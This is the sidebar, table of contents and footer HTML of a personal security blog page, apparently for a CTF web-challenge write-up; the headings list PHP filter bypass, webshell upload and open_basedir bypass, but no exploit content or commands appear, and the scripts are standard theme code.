href="/2020/10/22/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-1/" title="CISCN2019_华北赛区_Day1_Web1-Dropbox"><img class="cover" src="/images/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-22</div><div class="title">CISCN2019_华北赛区_Day1_Web1-Dropbox</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/logo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">0xL0r1cP03m</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">130</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">101</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/m4xlmum"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/m4xlmum" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2994016494@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">1.源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-php%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87preg-match-%E5%87%BD%E6%95%B0rce"><span class="toc-number">2.</span> <span class="toc-text">2.php不可见字符绕过preg_match()函数rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%B8%8A%E4%BC%A0webshell"><span class="toc-number">3.</span> <span class="toc-text">3.上传webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">1.上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">3.2.</span> <span class="toc-text">2.上传文件的脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%BB%95%E8%BF%87disable-function%E4%B9%8Bopen-basedir"><span class="toc-number">4.</span> <span class="toc-text">4.绕过disable_function之open_basedir:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-flag"><span class="toc-number">5.</span> <span class="toc-text">5.flag</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/06/01/ctfshow%E5%86%85%E9%83%A8%E8%B5%9Breverse/" title="ctfshow内部赛reverse"><img src="/images/ctfshow%E5%86%85%E9%83%A8%E8%B5%9Breverse.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow内部赛reverse"/></a><div class="content"><a class="title" href="/2022/06/01/ctfshow%E5%86%85%E9%83%A8%E8%B5%9Breverse/" title="ctfshow内部赛reverse">ctfshow内部赛reverse</a><time datetime="2022-06-01T15:12:50.000Z" title="Created 2022-06-01 23:12:50">2022-06-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/26/ctfshow%E8%90%8C%E6%96%B0%E8%B5%9BReverse/" title="ctfshow萌新赛Reverse"><img src="/images/ctfshow%E8%90%8C%E6%96%B0%E8%B5%9BReverse.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow萌新赛Reverse"/></a><div class="content"><a class="title" href="/2022/05/26/ctfshow%E8%90%8C%E6%96%B0%E8%B5%9BReverse/" title="ctfshow萌新赛Reverse">ctfshow萌新赛Reverse</a><time datetime="2022-05-26T14:03:48.000Z" title="Created 2022-05-26 22:03:48">2022-05-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A/" title="安卓去广告"><img src="/images/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="安卓去广告"/></a><div class="content"><a class="title" href="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A/" title="安卓去广告">安卓去广告</a><time datetime="2022-05-19T13:14:56.000Z" title="Created 2022-05-19 21:14:56">2022-05-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/18/burpsuite%E6%8A%93%E5%AE%89%E5%8D%93%E5%8C%85/" title="burpsuite抓安卓包"><img src="/images/burpsuite%E6%8A%93%E5%AE%89%E5%8D%93%E5%8C%85.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="burpsuite抓安卓包"/></a><div class="content"><a class="title" href="/2022/05/18/burpsuite%E6%8A%93%E5%AE%89%E5%8D%93%E5%8C%85/" title="burpsuite抓安卓包">burpsuite抓安卓包</a><time datetime="2022-05-18T09:34:49.000Z" title="Created 2022-05-18 17:34:49">2022-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%83%E3%80%81input/" title="pwnable题解、七、input"><img src="/images/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%83%E3%80%81input.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnable题解、七、input"/></a><div class="content"><a class="title" href="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%83%E3%80%81input/" title="pwnable题解、七、input">pwnable题解、七、input</a><time datetime="2022-05-16T10:47:52.000Z" title="Created 2022-05-16 18:47:52">2022-05-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 0xL0r1cP03m</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
